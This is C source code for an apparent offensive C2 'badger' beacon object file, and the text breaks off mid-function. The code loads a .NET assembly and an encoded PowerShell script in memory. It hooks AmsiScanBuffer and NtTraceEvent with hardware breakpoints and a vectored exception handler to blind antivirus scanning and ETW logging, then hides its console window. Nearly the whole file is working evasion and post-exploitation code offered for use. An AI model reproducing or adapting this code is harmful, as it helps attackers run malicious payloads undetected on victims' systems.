#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
//#include "psinline.h"
#include "Clr.h"
#include "badger_exports.h"
#include "common.h"
#include "HwBpEngine.h"
#include "HwBpExceptions.h"
#include "utils.h"
//#include "global.c"

#if _WIN64

WCHAR** gdispatch = NULL;

VOID HwBpExAmsiScanBuffer(
        IN OUT PEXCEPTION_POINTERS Exception
) {
    PVOID Return = NULL;

    /* get AmsiResult param */
    EXCEPTION_ARG_5( Exception ) = 0;

    /* set return to S_OK */
    EXCEPTION_SET_RET( Exception, 0x80070057 ); /* invalid parameter */

    /* just return now */
    Return = EXCEPTION_GET_RET( Exception );
    EXCEPTION_ADJ_STACK( Exception, sizeof( PVOID ) );
    EXCEPTION_SET_RIP( Exception, U_PTR( Return ) );
}

VOID HwBpExNtTraceEvent(
        IN OUT PEXCEPTION_POINTERS Exception
) {
    PVOID Return = NULL;

    /* just return without tracing an event */
    Return = EXCEPTION_GET_RET( Exception );
    EXCEPTION_ADJ_STACK( Exception, sizeof( PVOID ) );
    EXCEPTION_SET_RIP( Exception, U_PTR( Return ) );
}

#endif
//
////START HWBPENGINE
PHWBP_ENGINE gEngine = NULL;
HANDLE ghMutex = INVALID_HANDLE_VALUE;
//\
//
///*!
// * Init Hardware breakpoint engine by
// * registering a Vectored exception handler
// * @param Engine   if emtpy global handler gonna be used
// * @param Handler
// * @return
// */
LONG ExceptionHandler(
        IN OUT PEXCEPTION_POINTERS Exception
);
//
NTSTATUS HwBpEngineInit(
        OUT PHWBP_ENGINE Engine,
        IN  PVOID        Handler
) {
    PHWBP_ENGINE HwBpEngine  = Engine;
    PVOID        HwBpHandler = Handler;

    /* check if an engine object has been specified in the function param.
     * if not then check if teh callee want's to init the global engine.
     * tho if the global engine has been already init then abort  */
//    if ( ( ! HwBpEngine && ! HwBpHandler ) ) {
//        return STATUS_INVALID_PARAMETER;
//    }

    /* since we did not specify an engine let's use the global one */
    if ( ! HwBpEngine ) {
        HwBpEngine  = MSVCRT$malloc( sizeof( HWBP_ENGINE ) );
        HwBpHandler = &ExceptionHandler;
    }

    /* register Vectored exception handler */
    if ( ! ( HwBpEngine->Veh = KERNEL32$AddVectoredExceptionHandler( TRUE, HwBpHandler ) ) ) {
        return STATUS_UNSUCCESSFUL;
    }

    /* tell the engine that it has not added anything atm */
    HwBpEngine->First = TRUE;

    gEngine = HwBpEngine;
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] gEngine = 0x%p\n",gEngine);
#endif
    return STATUS_SUCCESS;
}

/////*!
//// * Set hardware breakpoint on specified address
//// * @param Tib
//// * @param Address
//// * @param Position
//// * @param Add
//// * @return
//// */
NTSTATUS HwBpEngineSetBp(
        IN DWORD Tid,
        IN PVOID Address,
        IN BYTE  Position,
        IN BYTE  Add
) {
    //CLIENT_ID         Client  = { 0 };
    CONTEXT           Context = { 0 };
    HANDLE            Thread  = NULL;
    NTSTATUS          Status  = STATUS_SUCCESS;
    //OBJECT_ATTRIBUTES ObjAttr = { 0 };
//
//    /* Initialize Object Attributes */
//    //InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );
//
////    Client.UniqueProcess = C_PTR( Pid );
////    Client.UniqueThread  = C_PTR( Tid );
//
//    /* try to get open thread handle */
    Thread = KERNEL32$OpenThread(THREAD_ALL_ACCESS,FALSE,Tid);
    if(Thread == INVALID_HANDLE_VALUE){
        BadgerDispatch(gdispatch,"OpenThread failed with error: %d",KERNEL32$GetLastError());
        goto FAILED;
    }

    Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    /* try to get context of thread */
    if(!KERNEL32$GetThreadContext(Thread,&Context)){
        BadgerDispatch(gdispatch,"GetThreadContext failed with error: %d",KERNEL32$GetLastError());
        goto FAILED;
    }

    /* add hardware breakpoint */
    if ( Add )
    {
        /* set address */
        ( &Context.Dr0 )[ Position ] = U_PTR( Address );

        /* setup registers */
        Context.Dr7 &= ~( 3ull << ( 16 + 4 * Position ) );
        Context.Dr7 &= ~( 3ull << ( 18 + 4 * Position ) );
        Context.Dr7 |= 1ull << ( 2 * Position );
    }
    else /* remove hardware breakpoint */
    {
        if ( ( &Context.Dr0 )[ Position ] == Address ) {
#ifdef DEBUG
            BadgerDispatch(gdispatch,
                           "Dr Registers:  \n"
                           "- Dr0[%d]: %p  \n"
                           "- Dr7   : %p  \n",
                           Position, ( &Context.Dr0 )[ Position ],
                           Context.Dr7
            );
#endif
            ( &Context.Dr0 )[ Position ] = U_PTR( NULL );
            Context.Dr7 &= ~( 1ull << ( 2 * Position ) );
#ifdef DEBUG
            BadgerDispatch(gdispatch,
                           "Dr Registers:  \n"
                           "- Dr0[%d]: %p  \n"
                           "- Dr7   : %p  \n",
                           Position, ( &Context.Dr0 )[ Position ],
                           Context.Dr7
            );
#endif
        }
    }

    if(!KERNEL32$SetThreadContext(Thread,&Context)){
        BadgerDispatch(gdispatch,"failed second getThreadContext. Error = %d\n",KERNEL32$GetLastError());
        goto FAILED;
    }

    return Status;

    FAILED:
    if ( Thread ) {
        KERNEL32$CloseHandle( Thread );
        Thread = NULL;
    }

    return Status;
}

/////*!
//// * Set an hardware breakpoint to an address
//// * and adds it to the engine breakpoints list linked
//// * @param Engine
//// * @param Thread
//// * @param Address
//// * @param Function
//// * @param Position
//// * @return
//// */
NTSTATUS HwBpEngineAdd(
        IN PHWBP_ENGINE Engine,
        IN DWORD        Tid,
        IN PVOID        Address,
        IN PVOID        Function,
        IN BYTE         Position
) {
    PHWBP_ENGINE HwBpEngine = gEngine;
    PBP_LIST     BpEntry    = NULL;
#ifdef DEBUG
    BadgerDispatch(gdispatch, "Engine:[%p] Tid:[%d] Address:[%p] Function:[%p] Position:[%d]\n", HwBpEngine, Tid, Address, Function, Position );
#endif
//    /* check if engine has been specified */
//    if ( ! HwBpEngine ) {
//        return STATUS_INVALID_PARAMETER;
//    }

    /* check if the right params has been specified */
    if ( ! Address || ! Function ) {
        return STATUS_INVALID_PARAMETER;
    }

    /* if no engine specified use the global one */
//    if ( ! HwBpEngine ) {
//        HwBpEngine = Instance.HwBpEngine;
//    }

    /* create bp entry */
    BpEntry = MSVCRT$malloc( sizeof( BP_LIST ) );
    BpEntry->Tid      = Tid;
    BpEntry->Address  = Address;
    BpEntry->Function = Function;
    BpEntry->Position = Position;
    BpEntry->Next     = gEngine->Breakpoints;

    /* set breakpoint */
    if ( ! NT_SUCCESS( HwBpEngineSetBp( Tid, Address, Position, TRUE ) ) ) {
        BadgerDispatch(gdispatch, "[HWBP] Failed to set hardware breakpoint\n" );
        goto FAILED;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch, "[HWBP] Added hardware breakpoint: Tid:[%d] Addr:[%p] Pos:[%d]\n", Tid, Address, Position );
#endif

    /* append breakpoint */
    gEngine->Breakpoints = BpEntry;

    return STATUS_SUCCESS;

    FAILED:
    if ( BpEntry ) {
        MSVCRT$free( BpEntry );
        BpEntry = NULL;
    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS HwBpEngineRemove(
        IN PHWBP_ENGINE Engine,
        IN DWORD        Tid,
        IN PVOID        Address
) {
    PHWBP_ENGINE HwBpEngine = NULL;
    PBP_LIST     BpEntry    = NULL;
    PBP_LIST     BpLast     = NULL;

//    if ( ! Engine  ) {
//        return STATUS_INVALID_PARAMETER;
//    }
//
//    if ( ! HwBpEngine ) {
//        HwBpEngine = Instance.HwBpEngine;
//    }


    /* set linked list */
    BpEntry = BpLast = gEngine->Breakpoints;

    for ( ;; )
    {
        /* check if BpEntry is NULL */
        if ( ! BpEntry ) {
            break;
        }

        /* is it the breakpoint we want to remove ? */
        if ( BpEntry->Tid == Tid && BpEntry->Address == Address )
        {
            /* unlink from linked list */
            BpLast->Next = BpEntry->Next;

            /* disable hardware breakpoint */
            HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, FALSE );

            /* zero out struct */
            BadgerMemset( BpEntry, 0,sizeof( BP_LIST ) );

            /* free memory struct */
            MSVCRT$free( BpEntry );

            break;
        }

        BpLast  = BpEntry;
        BpEntry = BpEntry->Next;
    }

    return STATUS_SUCCESS;
}

NTSTATUS HwBpEngineDestroy(
        IN PHWBP_ENGINE Engine
) {
    PHWBP_ENGINE HwBpEngine = Engine;
    PBP_LIST     BpEntry    = NULL;
    PBP_LIST     BpNext     = NULL;

    if ( ! gEngine ) {
        return STATUS_INVALID_PARAMETER;
    }
    KERNEL32$WaitForSingleObject(ghMutex,INFINITE);
//    if ( ! HwBpEngine ) {
//        HwBpEngine = Instance.HwBpEngine;
//    }

    /* remove Vector exception handler */

    KERNEL32$RemoveVectoredExceptionHandler( gEngine->Veh );

    BpEntry = gEngine->Breakpoints;

    /* remove all breakpoints and free memory */
    do {
        /* check if BpEntry is NULL */
        if ( ! BpEntry ) {
            break;
        }

        /* get next element from linked list */
        BpNext = BpEntry->Next;

        /* disable hardware breakpoinnt */
        HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, TRUE );

        /* zero out struct */
        BadgerMemset( BpEntry,0, sizeof( BP_LIST ) );

        /* free memory struct */
        MSVCRT$free( BpEntry );

        BpEntry = BpNext;
    } while ( TRUE );

    /* free global state */
//    if ( HwBpEngine == Instance.HwBpEngine ) {
//        NtHeapFree( HwBpEngine );
//
//        Instance.HwBpEngine = NULL;
//    }

    MSVCRT$free(gEngine);

    gEngine = NULL;
    KERNEL32$ReleaseMutex(ghMutex);
    return STATUS_SUCCESS;
}
//
///*!
// * Global exception handler
// * @param Exception
// * @return
// */
LONG ExceptionHandler(
        IN OUT PEXCEPTION_POINTERS Exception
) {
    PBP_LIST BpEntry = NULL;
    BOOL     Found   = FALSE;
#ifdef  DEBUG
    BadgerDispatch(gdispatch, "Exception Address: %p\n", Exception->ExceptionRecord->ExceptionAddress );
    BadgerDispatch(gdispatch, "Exception Code   : %p\n", Exception->ExceptionRecord->ExceptionCode );
#endif
    KERNEL32$WaitForSingleObject (ghMutex, INFINITE);
    if ( Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP && gEngine != NULL)
    {
        BpEntry = gEngine->Breakpoints;
        /* search in linked list for bp entry */
        do {
        /* stop search */
        if ( ! BpEntry ) {
        break;
        }

        /* check if it's the address we want */
        if ( BpEntry->Address == Exception->ExceptionRecord->ExceptionAddress ) {
        Found = TRUE;

            /* remove breakpoint */
            HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, FALSE );

            /* execute registered exception */
            ( ( VOID (*)( PEXCEPTION_POINTERS ) ) BpEntry->Function ) ( Exception );

            break;
        }

        /* Next entry */
        BpEntry = BpEntry->Next;
        } while ( TRUE );
#ifdef DEBUG
        BadgerDispatch(gdispatch, "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" );
#endif
        if ( Found ) {
            KERNEL32$ReleaseMutex(ghMutex);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    KERNEL32$ReleaseMutex(ghMutex);
    return EXCEPTION_CONTINUE_SEARCH;
}
//
//////END HWBPENGINE
///*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
    *mailHandle = KERNEL32$CreateMailslotA(lpszSlotName,
                                           0,                             //No maximum message size
                                           MAILSLOT_WAIT_FOREVER,         //No time-out for operations
                                           (LPSECURITY_ATTRIBUTES)NULL);  //Default security

    if (*mailHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    else
        return TRUE;
}

///*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    size_t size = 65535;
    char* achID = (char*)MSVCRT$malloc(size);
    MSVCRT$memset(achID, 0, size);
    DWORD cAllMessages = 0;
    HANDLE hEvent;
    OVERLAPPED ov;

    hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
    if (NULL == hEvent)
        return FALSE;
    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    fResult = KERNEL32$GetMailslotInfo(*mailHandle, //Mailslot handle
                                       (LPDWORD)NULL,               //No maximum message size
                                       &cbMessage,                  //Size of next message
                                       &cMessage,                   //Number of messages
                                       (LPDWORD)NULL);              //No read time-out


    if (!fResult)
    {
        BadgerDispatch(gdispatch,"[-] GetMailslotInfo failed with error = %d\n",KERNEL32$GetLastError());
        BadgerDispatch(gdispatch,"[-] cbMessage = %d\n[-] cbMessage = %d\n",cbMessage,cMessage);
        MSVCRT$free(achID);
        return FALSE;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] cbMessage = %d\n[*] cMessage = %d\n",cbMessage,cMessage);
#endif
    if (cbMessage == MAILSLOT_NO_MESSAGE)
    {
        MSVCRT$free(achID);
        return TRUE;
    }

    cAllMessages = cMessage;

    while (cMessage != 0)  //Get all messages
    {
        //Allocate memory for the message.
        lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, KERNEL32$lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
        if (NULL == lpszBuffer) {
            MSVCRT$free(achID);
            return FALSE;
        }
        lpszBuffer[0] = '\0';

        fResult = KERNEL32$ReadFile(*mailHandle,
                                    lpszBuffer,
                                    cbMessage,
                                    &cbRead,
                                    &ov);

        if (!fResult)
        {
            KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
            MSVCRT$free(achID);
            return FALSE;
        }

        //Copy mailslot output to returnData buffer
        MSVCRT$_snprintf(output + BadgerStrlen(output), BadgerStrlen(lpszBuffer) + 1, "%s", lpszBuffer);

        fResult = KERNEL32$GetMailslotInfo(*mailHandle,  //Mailslot handle
                                           (LPDWORD)NULL,               //No maximum message size
                                           &cbMessage,                  //Size of next message
                                           &cMessage,                   //Number of messages
                                           (LPDWORD)NULL);              //No read time-out

        if (!fResult)
        {
            MSVCRT$free(achID);
            return FALSE;
        }

    }

    cbMessage = 0;
    KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
//_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
    KERNEL32$CloseHandle(hEvent);
    return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void * assembly, int length) {
    char* assembly_c;
    assembly_c = (char*)assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (int i = 0; i < length; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
            {
                break;
            }
            else
            {
                if (j == (9))
                {
                    return 1;
                }
            }
        }
    }

    return 0;
}



/*Start CLR*/
BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRRuntimeInfo * *ppClrRuntimeInfo, ICorRuntimeHost * *ppICorRuntimeHost) {

    //Declare variables
    HRESULT hr = 0;

    //Get the CLRMetaHost that tells us about .NET on this machine
    hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

    if (hr == S_OK)
    {
        //Get the runtime information for the particular version of .NET
        hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
        if (hr == S_OK)
        {
            /*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
            loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
            if ((hr == S_OK) && fLoadable)
            {
                //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                if (hr == S_OK)
                {
                    //Start it. This is okay to call even if the CLR is already running
                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
                }
                else
                {
                    //If CLR fails to load fail gracefully
                    BadgerDispatch(gdispatch , "[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                //If CLR fails to load fail gracefully
                BadgerDispatch(gdispatch , "[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            //If CLR fails to load fail gracefully
            BadgerDispatch(gdispatch , "[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        //If CLR fails to load fail gracefully
        BadgerDispatch(gdispatch , "[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
        return 0;
    }

    //CLR loaded successfully
    return 1;
}

/*Check Console Exists*/
BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
    if(!KERNEL32$GetConsoleWindow())
        return FALSE;
    return TRUE;
}

/*BOF Entry Point*/
void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly in memory
    gdispatch = dispatch;
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Entered\n");
#endif
    char* appDomain = "asmranddomain";
    char* assemblyArguments = NULL;
    char* slotName = "mysecondslot";
    ULONG entryPoint = 1;
    SIZE_T toEncodeSize = 0;
    char* toEncode = NULL;
    HRESULT hr = 0;
    ICLRMetaHost* pClrMetaHost = NULL;//done
    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
    ICorRuntimeHost* pICorRuntimeHost = NULL;
    IUnknown* pAppDomainThunk = NULL;
    AppDomain* pAppDomain = NULL;
    Assembly* pAssembly = NULL;
    MethodInfo* pMethodInfo = NULL;
    VARIANT vtPsa = { 0 };
    SAFEARRAYBOUND rgsabound[1] = { 0 };
    wchar_t* wAssemblyArguments = NULL;
    wchar_t* wAppDomain = NULL;
    wchar_t* wNetVersion = NULL;
    HWND wnd = NULL;
    LPWSTR* argumentsArray = NULL;
    int argumentCount = 0;
    HANDLE stdOutput;
    char* slotPath = NULL;
    HANDLE stdError;
    HANDLE mainHandle = INVALID_HANDLE_VALUE;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    size_t wideSize = 0;
    size_t wideSize2 = 0;
    BOOL success = 1;
    size_t size = 65535;
    char* returnData = (char*)MSVCRT$malloc(size);
    MSVCRT$memset(returnData, 0, size);
    VARIANT retVal = {0};
    VARIANT obj = {0};
    //Extract data sent
    if(argc < 2){
        BadgerDispatch(gdispatch,"[-] Necessary at least 2 args. Assembly and powershell script\n");
        return;
    }
    SIZE_T assemblyBytesLen = BadgerGetBufferSize(argv[0]);
    SIZE_T psScriptLen = BadgerGetBufferSize(argv[1]);
    char* assemblyBytes = argv[0];
    char* ps_script = argv[1];
    SIZE_T base64_size = 0;
    //BadgerDispatch(gdispatch,"%s\n",ps_script);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Size of assembly: %d\n[*] Size of powershell script %d\n",assemblyBytesLen,psScriptLen);
    BadgerDispatch(gdispatch,"assemblyBytes = 0x%p, argv[0] = 0x%p\n",assemblyBytes,argv[0]);
#endif
    //    for(int i=0;i<100;i++){
//        BadgerDispatch(gdispatch,"argv[0][%d] = %d\n",i,argv[0][i]);
//    }
//    for(int i=0;i<100;i++){
//        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,argv[0][i]);
//    }

    toEncodeSize += psScriptLen;
    if(argc > 2){
        for(int i=2;i<argc;i++){
#ifdef DEBUG
            BadgerDispatch(gdispatch,"argv[i] = %s\n",argv[i]);
            BadgerDispatch(gdispatch,"argv[i] size = %d\n", BadgerStrlen(argv[i]));
#endif
            toEncodeSize += BadgerStrlen(argv[i])+1;
        }
    }
    //BadgerDispatch(gdispatch,"[*] toEncodeSize = %d\n",toEncodeSize);
    toEncode = MSVCRT$malloc(toEncodeSize+0x10);
    if(toEncode == NULL){
        BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed for allocating toEncode\n");
        return;
    }
    BadgerMemset(toEncode,0,toEncodeSize+0x10);
    BadgerMemcpy(toEncode,ps_script,psScriptLen);
    MSVCRT$strcat(toEncode,"\r\n\r\n");

    for(int i=2;i<argc;i++){
        MSVCRT$strcat(toEncode,argv[i]);
        MSVCRT$strcat(toEncode," ");
    }
    MSVCRT$strcat(toEncode,"\r\n");

//    for(int i=0;i<100;i++){
//        BadgerDispatch(gdispatch,"toEncode[%d] = %d\n",i,toEncode[i]);
//    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"toencode size = %d\n",BadgerStrlen(toEncode));
#endif
    //BadgerDispatch(gdispatch,"%s\n",toEncode);
    CRYPT32$CryptBinaryToStringA(toEncode, BadgerStrlen(toEncode),0x1 | 0x40000000,NULL,&base64_size);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"base64_size = %d\n",base64_size);
#endif
    PBYTE ps_script_b64 = MSVCRT$malloc(base64_size+0x10);
    if(ps_script_b64 == NULL){
        BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed allocate ps_script_b64\n");
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] ps_script_b64 = 0x%p\n",ps_script_b64);
#endif
    BadgerMemset(ps_script_b64,0x0,base64_size+0x10);

    if(!CRYPT32$CryptBinaryToStringA(toEncode, BadgerStrlen(toEncode),0x1 | 0x40000000,ps_script_b64,&base64_size)){
        BadgerDispatch(gdispatch,"[-] CryptBinaryToStringA failed with error: %d\n",KERNEL32$GetLastError());
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] CryptBinaryToStringA returned successfully\n");
#endif
    MSVCRT$free(toEncode);
    toEncode = NULL;
    assemblyArguments = MSVCRT$malloc(base64_size+0x20);
    if(assemblyArguments == NULL){
        BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed for allocating assemblyArguments\n");
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] assemblyArguments = 0x%p\n",assemblyArguments);
#endif
    BadgerMemset(assemblyArguments,0,base64_size+0x20);
    BadgerMemcpy(assemblyArguments,ps_script_b64,base64_size);
    MSVCRT$free(ps_script_b64);
    ps_script_b64 = NULL;

    //Create slot and pipe names
    SIZE_T slotNameLen = MSVCRT$strlen(slotName);
    slotPath = MSVCRT$malloc(slotNameLen + 14);
    MSVCRT$memset(slotPath, 0, slotNameLen + 14);
    MSVCRT$memcpy(slotPath, "\\\\.\\mailslot\\", 13 );
    MSVCRT$memcpy(slotPath+13, slotName, slotNameLen+1 );

//    for(int i=0;i<100;i++){
//        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,assemblyBytes[i]);
//    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"assemlyBytesLen = %d\n",assemblyBytesLen);
#endif
    //Determine .NET assemblie version
    if(FindVersion((void*)assemblyBytes, assemblyBytesLen))
    {
        wNetVersion = L"v4.0.30319";
    }
    else
    {
        wNetVersion = L"v2.0.50727";
    }
#ifdef DEBUG
    BadgerDispatchW(gdispatch,L"[*] Using .NET version %ws\n",wNetVersion);
#endif
    ghMutex = KERNEL32$CreateMutexA(
            NULL,              // default security attributes
            FALSE,             // initially not owned
            NULL);             // unnamed mutex
    HwBpEngineInit( NULL, NULL );
    FARPROC amsiscanbuffer = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"),"AmsiScanBuffer");
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] AmsiScanBuffer = 0x%p\n",amsiscanbuffer);
#endif
    PTEB teb = NtCurrentTeb();
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] Teb = 0x%p\n",teb);
    BadgerDispatch(gdispatch,"[*] UniqueThread = 0x%p\n",teb->ClientId.UniqueThread);
#endif
    FARPROC nttraceevent = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("ntdll.dll"),"NtTraceEvent");
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] NtTraceEvent = 0x%p\n",nttraceevent);
#endif
    HwBpEngineAdd(NULL,(DWORD)(teb->ClientId.UniqueThread),amsiscanbuffer,HwBpExAmsiScanBuffer,0);
    HwBpEngineAdd(NULL,(DWORD)(teb->ClientId.UniqueThread),nttraceevent,HwBpExNtTraceEvent,1);

    //Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
    size_t convertedChars = 0;
    wideSize = MSVCRT$strlen(assemblyArguments) + 1;
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] wideSize = %d\n",wideSize);
#endif
    wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
    MSVCRT$mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] ConvertedChars = %d\n",convertedChars);
#endif
    //Convert appDomain to wide string wAppDomain to pass to CreateDomain
    size_t convertedChars2 = 0;
    wideSize2 = MSVCRT$strlen(appDomain) + 1;
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] wideSize2 = %d\n",wideSize2);
#endif
    wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
    MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] ConvertedChars2 = %d\n",convertedChars2);
#endif
    //Get an array of arguments so arugements can be passed to .NET assembly
    argumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &argumentCount);
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] argumentCount = %d\n",argumentCount);
#endif
    //Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
    vtPsa.vt = (VT_ARRAY | VT_BSTR);
    vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

    for (long i = 0; i < argumentCount; i++)
    {
        //Insert the string from argumentsArray[i] into the safearray
        OLEAUT32$SafeArrayPutElement(vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
    }

    //Start CLR
    success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);

    //If starting CLR fails exit gracefully
    if (success != 1) {
        //MSVCRT$free(assemblyArguments);
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] CLR started successfully\n");
#endif
    //Create Mailslot
    success = MakeSlot(slotPath, &mainHandle);

    if(!success){
        BadgerDispatch(gdispatch,"[-] issue with creating slot\n");
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] mainHandle = 0x%p\n",mainHandle);
#endif
    hFile = KERNEL32$CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        BadgerDispatch(gdispatch,"[-] CreateFile to slotpath failed with error = %d\n",KERNEL32$GetLastError());
        goto CLEANUP;
    }
#ifdef DEBUG
    BadgerDispatch(gdispatch,"[*] hFile = 0x%p\n",hFile);
#endif
    //Attach or create console
    BOOL frConsole = 0;
    BOOL attConsole = 0;
    attConsole = consoleExists();
    if (attConsole != 1)
    {
        frConsole = 1;

        //_AllocConsole AllocConsole = (_AllocConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
        //_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
        if(KERNEL32$AllocConsole())
#ifdef DEBUG
            BadgerDispatch(gdispatch,"[*] Created Console\n");
#endif
        //Hide Console Window
        //HINSTANCE hinst = LoadLibrary("user32.dll");
        //_ShowWindow ShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
        wnd = KERNEL32$GetConsoleWindow();
#ifndef DEBUG
        if (wnd)
            USER32$ShowWindow(wnd, SW_HIDE);
#endif
    }

    //Get current stdout handle so we can revert stdout after we finish
    //_GetStdHandle GetStdHandle = (_GetStdHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetStdHandle");
    stdOutput = KERNEL32$GetStdHandle(((DWORD)-11));
    stdError = KERNEL32$GetStdHandle(((DWORD)-12));
    //Set stdout to our newly created named pipe or mail slot
    //_SetStdHandle SetStdHandle = (_SetStdHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
    success = KERNEL32$SetStdHandle (((DWORD)-11), hFile);
    if(!success){
        BadgerDispatch(gdispatch,"[-] failed to set stdout with error = 0x%d\n",KERNEL32$GetLastError());
        goto CLEANUP;
    }
    success = KERNEL32$SetStdHandle (((DWORD)-12), hFile);
    if(!success){
        BadgerDispatch(gdispatch,"[-] failed to set stderr with error = 0x%d\n",KERNEL32$GetLastError());
        goto CLEANUP;
    }
    //Create our AppDomain
    hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
    if(hr == S_OK){
        hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);
        if(hr == S_OK){
#ifdef DEBUG
